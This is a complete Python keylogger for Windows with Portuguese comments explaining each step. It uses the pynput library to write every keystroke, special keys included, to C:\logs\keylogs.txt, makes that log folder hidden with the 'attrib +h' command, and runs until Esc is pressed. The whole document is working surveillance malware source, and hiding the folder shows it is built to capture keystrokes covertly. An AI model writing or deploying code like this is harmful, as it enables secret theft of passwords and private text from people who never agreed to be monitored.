# Importa as classes Key e Listener da biblioteca pynput para capturar eventos de teclado
from pynput.keyboard import Key, Listener  
import os  # Importa o módulo os, que fornece funções para interagir com o sistema operacional
import subprocess  # Importa subprocess para executar comandos do sistema operacional

# Define o caminho absoluto onde os logs serão salvos. Neste caso, será criado o diretório "C:\logs".
log_dir = "C:\\logs"
# Cria o caminho completo para o arquivo de log, que será chamado "keylogs.txt" dentro do diretório "C:\logs".
log_file = os.path.join(log_dir, "keylogs.txt")

# Verifica se o diretório "C:\logs" existe
if not os.path.exists(log_dir):
    # Se o diretório não existir, cria-o
    os.makedirs(log_dir)
    # Torna a pasta oculta no Windows usando o comando 'attrib +h'
    subprocess.call(["attrib", "+h", log_dir])

def on_press(key):
    """Função que é chamada sempre que uma tecla é pressionada.
    
    Captura a tecla pressionada e a salva no arquivo de log.
    """
    # Abre o arquivo de log no modo de acréscimo ('a'), para adicionar novas entradas sem apagar as existentes
    with open(log_file, "a") as f:
        try:
            # Tenta escrever a tecla pressionada no arquivo como um caractere
            f.write(f"{key.char}")  
        except AttributeError:
            # Se a tecla pressionada for uma tecla especial (por exemplo, Ctrl, Alt, etc.),
            # registra o nome da tecla especial no arquivo de log
            f.write(f" {key} ")

def on_release(key):
    """Função que é chamada sempre que uma tecla é liberada.
    
    Verifica se a tecla 'Esc' foi pressionada para encerrar o keylogger.
    """
    # Se a tecla liberada for a tecla 'Esc', retorna False para interromper o listener
    if key == Key.esc:
        return False  # Isso faz o listener parar e finaliza a execução do keylogger

# Configura o listener de teclado
# O listener monitora eventos de teclado e chama as funções on_press e on_release apropriadas
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Mantém o listener ativo até que seja interrompido por uma chamada de retorno que retorna False
